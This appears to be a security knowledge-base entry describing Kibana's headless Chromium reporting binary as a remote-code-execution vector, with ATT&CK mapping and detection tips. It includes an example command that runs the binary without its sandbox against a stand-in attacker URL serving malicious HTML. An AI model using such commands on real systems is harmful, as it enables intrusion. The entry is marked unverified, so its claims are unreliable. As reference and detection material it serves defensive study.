---
url: null
tags:
  - browser
  - rce
type: tool
platforms:
  - Linux
description: Headless Chromium binary used by Kibana for reporting.
id: 2641c215-b9e4-47dc-993d-b60c13645fda
created_at: '2025-12-11T03:47:47.762Z'
updated_at: '2025-12-11T03:47:47.762Z'
verified: false
validated: true
submitted: true
---
# headless_shell

**Status**: Unverified

## Overview

headless_shell is the headless Chromium binary in Kibana's reporting plugin, vulnerable to RCE when run with --no-sandbox and loading malicious HTML.

## Description

It generates PDFs/PNGs from URLs but can be exploited for arbitrary code execution due to outdated versions and disabled sandboxing.

## Features

- Headless browsing: Render web content without UI
- Reporting integration: Used by Kibana for exports
- Exploit vector: Loads and executes malicious JS

## Installation

### Requirements

- Kibana installation

### Install Commands

Available within Kibana Docker image.

## Basic Usage

```bash
./headless_shell --help
```

### Common Options

| Option | Description |
|--------|-------------|
| `--no-sandbox` | Disable sandbox | 

## Examples

### Example 1: Basic Usage

```bash
./headless_shell --no-sandbox http://example.com
```

### Example 2: Advanced Usage

```bash
./headless_shell --no-sandbox http://attacker.com/malicious.html
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Command-Line Interface]]
- [[Exploit Public-Facing Application]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Monitor process launches with --no-sandbox
- Log URL loads in reporting jobs

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- #docker

## References

- Elastic Kibana documentation
